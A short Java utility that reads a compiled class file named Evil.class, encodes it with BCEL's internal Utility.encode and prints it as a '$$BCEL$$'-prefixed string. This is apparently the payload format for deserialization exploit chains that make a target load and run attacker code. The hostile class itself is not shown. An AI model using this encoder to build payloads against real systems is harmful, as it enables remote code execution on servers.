import java.io.*;
import java.nio.file.Files;
import com.sun.org.apache.bcel.internal.classfile.Utility;

public class BcelEncode
{
    public static void main ( String[] argv ) throws Exception
    {
        String  filename    = System.getProperty("user.dir") + "/target/classes/Evil.class";
        byte[]  buf         = Files.readAllBytes( ( new File( filename ) ).toPath() );

        String  str         = Utility.encode( buf, true );
        String  bcel        = "$$BCEL$$" + str;
        System.out.println( bcel );
    }
}